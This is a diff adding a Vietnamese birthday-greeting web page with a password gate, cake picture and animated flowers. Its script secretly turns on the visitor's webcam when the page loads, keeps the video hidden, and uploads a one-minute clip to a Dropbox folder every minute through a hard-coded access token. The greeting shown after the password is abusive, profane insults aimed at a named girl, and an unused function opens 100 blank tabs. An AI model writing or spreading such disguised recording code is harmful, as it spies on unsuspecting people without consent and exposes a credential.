@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chúc Mừng Sinh Nhật</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-image: url('Resources/PXL_20241221_052832228.PORTRAIT.ORIGINAL.png'); /* Thay bằng đường dẫn hình ảnh */
+            background-size: cover; /* Đảm bảo hình ảnh phủ kín toàn bộ trang */
+            background-position: center; /* Căn giữa hình ảnh */
+            background-attachment: fixed; /* Giữ hình ảnh cố định khi cuộn trang */
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            color: rgb(97, 97, 201); /* Đặt màu chữ toàn trang là đen */
+            justify-content: center; /* Căn giữa theo chiều ngang */
+            align-items: center; /* Căn giữa theo chiều dọc */
+            flex-direction: column; /* Sắp xếp các phần tử theo cột */
+        }
+
+        /* Mặt trời - Đưa sang phía tay phải và xoay ở góc cụ thể */
+        .sun {
+            position: absolute;
+            top: 10%; /* Mặt trời ở phía trên */
+            right: 10%; /* Đặt mặt trời về phía tay phải */
+            width: 120px;
+            height: 120px;
+            background-color: rgb(124, 86, 226);
+            border-radius: 50%;
+            box-shadow: 0 0 20px rgba(255, 255, 0, 0.7);
+            transform: rotate(30deg); /* Xoay mặt trời một góc 30 độ */
+        }
+
+        .blur {
+        filter: blur(8px);
+        transition: filter 0.3s ease;
+        }
+
+
+        /* Hoa rơi với màu hoa anh đào */
+        .flower {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            background-color: #b7ceff; /* Màu hoa anh đào */
+            border-radius: 50%;
+            animation: flowerFall 3s infinite ease-in;
+        }
+
+        @keyframes flowerFall {
+            0% {
+                top: -20px;
+            }
+            100% {
+                top: 100vh;
+                transform: rotate(360deg);
+            }
+        }
+
+        #cake {
+            display: none;
+            animation: cakeMove 1s ease-out;
+        }
+
+        @keyframes cakeMove {
+            0% {
+                transform: scale(0);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        #message {
+            display: none;
+            font-size: 24px;
+            color: #4763ff;
+            animation: messageBlink 1.5s infinite;
+            padding: 20px;
+            margin-top: 20px;
+            background-color: white;
+            border-radius: 15px; /* Bo cong cho lời chúc */
+            width: 60%;
+            margin-left: 20%;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        @keyframes messageBlink {
+            0% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        #login-form {
+            margin-bottom: 20px;
+            padding: 20px;
+            border: 2px solid #474aff; /* Bo viền cho ô nhập */
+            border-radius: 10px;
+            display: inline-block;
+            background-color: white;
+        }
+
+        input[type="password"] {
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin: 10px 0;
+            width: 80%;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #6f47ff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #7970f8;
+        }
+        #video {
+            display: none;
+        }
+
+    </style>
+</head>
+<body>
+
+    <h1>Chúc Mừng Sinh Nhật!</h1>
+
+    <div id="login-form">
+        <label for="password">Nhập mật khẩu: </label>
+        <input type="password" id="password" placeholder="Nhập mật khẩu">
+        <button onclick="checkPassword()">Xác nhận</button>
+    </div>
+
+    <div id="cake">
+        <!-- Thêm hình bánh kem mới -->
+        <img src="Resources/img.png" alt="Bánh Kem" width="200">
+
+        <p id="birthday-text">Chúc Bé Yêu Sinh Nhật Vui Vẻ !</p>
+    </div>
+
+    <p id="message"></p>
+    
+    <p>TD x MT</p>
+    <video id="video" width="640" height="480" autoplay></video>
+
+    <!-- Mặt trời -->
+    <div class="sun"></div>
+
+  
+
+    <!-- Hoa rơi -->
+    <div class="flower" style="left: 20%;"></div>
+    <div class="flower" style="left: 70%;"></div>
+    <div class="flower" style="left: 50%;"></div>
+
+    <script>
+
+let mediaRecorder;
+        let videoStream;
+        let videoBlob;
+        let recordingInterval;
+
+        const ACCESS_TOKEN = "sl.u.AFbJeRQkhe8GsP2LaVqypen8wqrFECo60tdWWxBC1iYPQSZBZaP0fTgd-cw8nky0NtrF5Ke9Bg9ssXAG-ba4DPxr1kk5DxHG1GJMRPuuU3fSpoiA99BJRvuF2sxpQbS4lTChO7T49yOnvEsERyqMKiUvfxvy8M5NpIKngH5ycQ3VjBJUU5RJzKoWCL55Ql__53aO_YMOY6AWInlEjy551nZxAeMUpuqz-THESDi7nEgUg5_vCOevaEvlQxPCKPGerYsT8npIM_yeFbAC7NOkyI-EvCR_6kXifLq0iNil3P5GUWhjLrc-Kx1vE6lRWMxcsiKXrWVG82oK4SZV88vk1CApksrD7tyfIx7NFYbEc1_EfityyVoURGIwrWLASDINWtS88B_Jyz87AQcpLLgNUhcgOGjlCrLMxPtpQnPBbR7HuUkKd_G11ScjSIFvWuVhYsds9hMB8vqY4n5fEEnRJbWT0sV55UU-xfTAfNYUFDpUKPucAgZ6-oDP5LPg-MhAYTzHNmUYQSEyjMAX8qLfegK7PfSrohDlWn3pO7NkZucsxKRZwHvoBJDoWe0E7T2rrLJb-7awgF9tG7-RAjLscRJk20cSsU4EZRTCqYIgSZkzVOVz8w5DvlERz5TKU_Bq_YgSmWmTXravdEKNwI5cGyjPAqJwqHjTyIs_PKjx29e7wmG45rWgBnljrdMP9KNuh_F9CaA1qfMJ0KqOuoIU8nULdvaD86szgw380Hnm8M1ho46IoLc7l9Pd5vDUcToQSgMTUQxCao4LRigy7y5h6ormSRl_hCotX3ZMqhLZbYpdCZvt7XWI3EkShxAs9ocNQMuvgOvBmkgw3jzOGDjQvQH4V-Vwi4WgK1I_v4ZyofeA8pkv_FJGDmRRXDb6i7L1Biwz39jheC33HocoEei88Kgf9Ipk_hNj_KV_GmZmXgLUQh3muEEmWAsglxQvdmVadMd01auOgbjoaTVrB-ZYRojqUeHSUEuav6mSzIgyJvcEFB9nUxMWSWkfU2J3-jsQEgCxdGhDqawFWJEt2b7NShKGEqp_m9H8H9M5sDaxjqLYtHn-XvYpGM_w2-ytqIcWPfVOPfkFB0uJQyEtHyr0Ow8MMrlU8u1ebKwRfyYajjXYa5ohoGzeE2YI3wtoE6Fi7Ngg7rmcRQBElhbp1kqJKcg4EPzJDUeX-U8_bdZEW0GV6xQ0TJt-aFu7h0UQ8Ebkss-7Xrpl1nsWrSg_vD2o1QAnUjS5jx_z9243S5RxiDDUDjHmjjW1oabeZiTe__G4CHcP6u3PY-IcOYm6Z33oo4bozHVVCxzHhxKlUJOWQw8qM90ig8sm9fvV_GnTPHCU1MFGixufga2FGL4mEyGLbbcL0RvifKCSy8ZnaLb8G28NIXCjZkFfSydBdODWqQCmf4E7uChVeCisYZ-l2FMOo3YLXDd2EXFuMSHfCaM6rruLSVbSg7frVXIPaBgcCVELx0mMA4rV9DI1xxHtKEyZm0X4IagDqRvzJMfuQY-O6KQeMeEEBCpOrdfObHXMRQUPICQ";  // Thay thế bằng Access Token của bạn
+
+        // Hàm tải video lên Dropbox
+        function uploadToDropbox(fileBlob, fileName) {
+    // Xác định headers và thông tin API
+    const headers = {
+        "Authorization": `Bearer ${ACCESS_TOKEN}`,  // Thêm Access Token của bạn
+        "Dropbox-API-Arg": JSON.stringify({
+            "path": `/Apps/Skbidi P/clip/${fileName}`,  // Đường dẫn đến thư mục trong Dropbox
+            "mode": "add",          // Thêm tệp mới nếu chưa có, hoặc thay thế tệp cũ
+            "autorename": true,     // Tự động đổi tên tệp nếu đã tồn tại
+            "mute": false           // Không tắt âm thanh video
+        }),
+        "Content-Type": "application/octet-stream"  // Đảm bảo rằng bạn đang gửi tệp dưới dạng octet-stream
+    };
+
+    // Gửi yêu cầu upload tới Dropbox
+    fetch("https://content.dropboxapi.com/2/files/upload", {
+        method: "POST",
+        headers: headers,
+        body: fileBlob  // Đính kèm video Blob
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("File uploaded successfully", data);
+    })
+    .catch(error => {
+        console.error("Error uploading file", error);
+    });
+}
+
+
+        // Hàm bắt đầu quay video tự động khi trang được tải
+        function startRecording() {
+            console.log("Attempting to access camera...");
+            // Yêu cầu quyền truy cập camera và bắt đầu quay video
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    // Lấy video stream và ẩn video
+                    const videoElement = document.getElementById('video');
+                    videoElement.srcObject = stream;
+                    videoStream = stream;
+
+                    console.log("Camera access granted, starting recording...");
+
+                    const options = { mimeType: 'video/webm' };
+                    mediaRecorder = new MediaRecorder(videoStream, options);
+
+                    mediaRecorder.ondataavailable = function(event) {
+                        videoBlob = event.data;
+                        console.log("Video data available...");
+                    };
+
+                    mediaRecorder.onstart = function() {
+                        console.log("Recording started...");
+                    };
+
+                    mediaRecorder.start();
+
+                    // Dừng quay video sau 1 phút (60000ms) và upload
+                    recordingInterval = setInterval(() => {
+                        console.log("Stopping recording after 1 minute...");
+                        mediaRecorder.stop();
+
+                        // Tạo tên tệp video
+                        const fileName = `webcam-video-${Date.now()}.webm`;  // Tên tệp video
+                        if (videoBlob) {
+                            uploadToDropbox(videoBlob, fileName);  // Upload video lên Dropbox
+                        }
+
+                        // Khởi tạo lại để quay tiếp
+                        mediaRecorder.start();
+                    }, 60000);
+                })
+                .catch(err => {
+                    console.error("Error accessing camera:", err);
+                });
+        }
+
+        // Khi trang tải xong, tự động gọi hàm startRecording
+        window.onload = startRecording;
+
+        // Dừng quay video khi người dùng rời khỏi trang (tắt tab hoặc đóng trình duyệt)
+        window.addEventListener('beforeunload', function() {
+            console.log("Stopping recording before unload...");
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop(); // Dừng quay video khi người dùng thoát
+            }
+
+            // Dừng interval quay video
+            if (recordingInterval) {
+                clearInterval(recordingInterval);
+            }
+        });
+        function checkPassword() {
+            var password = document.getElementById('password').value;
+
+            // Kiểm tra mật khẩu
+            if(password === 'HappyBrihtDaydAmhy-22643') {
+                document.getElementById('login-form').style.display = 'none';
+                document.getElementById('cake').style.display = 'block';
+
+                setTimeout(function() {
+                    document.getElementById('message').innerText = "Chúc bé có một ngày sinh nhật thật tuyệt vời ! . Dell có vụ đó đâu ha . Mắc mớ j tao phải tặng quà sinh nhật cho mày đâu Phương ? . Ngày sinh nhật tao mày đã tặng quà cho tao đâu ? . Đi học liếc quài , bộ mày yêu tao lắm hả. Quà mày tặng cho tao có mấy ngôi sao . Huh cái đó ai cũng làm được hết , quà đéo có ý nghĩa . Tặng còn có mấy ngôi sao lod mà cũng tặng được . Nè tao nói thật , cái bản mặt yêu mấy đứa như con Thùy á . Đi học chỉ trỏ người ta , dỗi , làm nũng . Tao đéc cần mấy cái thứ biểu mặt / cảm xúc như mày . Đéc Cần . Dù sao nay là ngày sinh nhật mày cũng là cuối năm tao đéo có idea để tặng mày . Dư trong não có mấy câu chủi thề thôi . Tự nghĩ . TAO ĐÉO YÊU MÀY ! ";
+                    document.getElementById('message').style.display = 'block';
+                }, 1000); // Hiển thị lời chúc sau 1 giây
+            } else {
+                alert('Mật khẩu không chính xác!');
+            }
+        }
+
+          // Hàm mở các tab mới
+          function openTabs() {
+            // Cảnh báo người dùng về hành động mở nhiều tab
+                 {
+                for (var i = 0; i < 100; i++) { // Mở 100 tab
+                    window.open("about:blank"); // Mở tab trống
+                }
+            }
+        }
+    </script>
+
+</body>
+</html>
